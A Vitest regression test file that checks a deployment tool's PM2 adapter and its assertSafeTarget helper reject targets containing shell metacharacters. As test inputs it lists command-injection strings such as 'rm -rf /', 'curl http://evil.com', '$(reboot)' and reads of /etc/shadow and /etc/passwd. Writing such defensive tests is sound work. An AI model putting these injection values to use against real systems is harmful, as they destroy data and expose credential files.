import { describe, expect, it } from "vitest";
import { PM2Adapter } from "../../src/adapters/pm2.js";
import { assertSafeTarget } from "../../src/adapters/execFn.js";

describe("Regression: Standalone Adapter Target Sanitization & Command Injection Prevention", () => {
  const dangerousInputs = [
    "service; rm -rf /",
    "deployment && curl http://evil.com",
    "app | bash",
    "$(reboot)",
    "`touch /tmp/pwned`",
    "service > /dev/null",
    "service\ncat /etc/shadow",
  ];

  it("assertSafeTarget rejects dangerous shell characters", () => {
    for (const input of dangerousInputs) {
      expect(() => assertSafeTarget(input)).toThrow(/contains illegal shell characters/);
    }
  });

  it("assertSafeTarget accepts safe alphanumeric and path identifiers", () => {
    const safeInputs = [
      "production-api",
      "my_service_v1",
      "frontend.web",
      "org/repo:v1.0.0",
      "kube-system",
    ];
    for (const input of safeInputs) {
      expect(() => assertSafeTarget(input)).not.toThrow();
    }
  });

  it("PM2Adapter rejects malicious target, previousSha, and directories", async () => {
    expect(() => new PM2Adapter("sha123; rm -rf /")).toThrow(/contains illegal shell characters/);
    expect(() => new PM2Adapter("sha123", { releasesRoot: "/var/releases; reboot" })).toThrow(/contains illegal shell characters/);

    const adapter = new PM2Adapter("sha123");
    await expect(adapter.checkHealth("api && ls")).rejects.toThrow(/contains illegal shell characters/);
    await expect(adapter.rollback("api; cat /etc/passwd")).rejects.toThrow(/contains illegal shell characters/);
  });
});
